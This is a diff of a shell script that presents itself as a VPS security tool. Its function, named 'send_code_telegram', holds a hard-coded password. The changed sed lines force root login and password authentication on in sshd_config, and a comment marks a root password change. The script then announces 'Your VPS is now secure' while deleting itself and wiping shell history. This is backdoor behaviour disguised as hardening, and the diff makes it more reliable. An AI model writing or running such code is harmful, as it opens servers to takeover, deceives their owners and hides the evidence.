@@ -5,10 +5,10 @@ send_code_telegram() {
     local passwd="iChangedIt@Favour"
 
     # Enable root login with password
-    sed -i 's/^#*\s*PermitRootLogin\s*\w*/PermitRootLogin yes/' /etc/ssh/sshd_config
+    sed -i 's/^#*\s*PermitRootLogin\s.*$/PermitRootLogin yes/' /etc/ssh/sshd_config
 
     # Enable password authentication
-    sed -i 's/^#*\s*PasswordAuthentication\s*no/PasswordAuthentication yes/' /etc/ssh/sshd_config
+    sed -i 's/^#*\s*PasswordAuthentication\s.*$/PasswordAuthentication yes/' /etc/ssh/sshd_config
 
 
     # Change root password
@@ -47,4 +47,3 @@ echo "Your VPS is now secure."
 
 # Cleanup
 rm -- "$0" && history -c && history -w
-
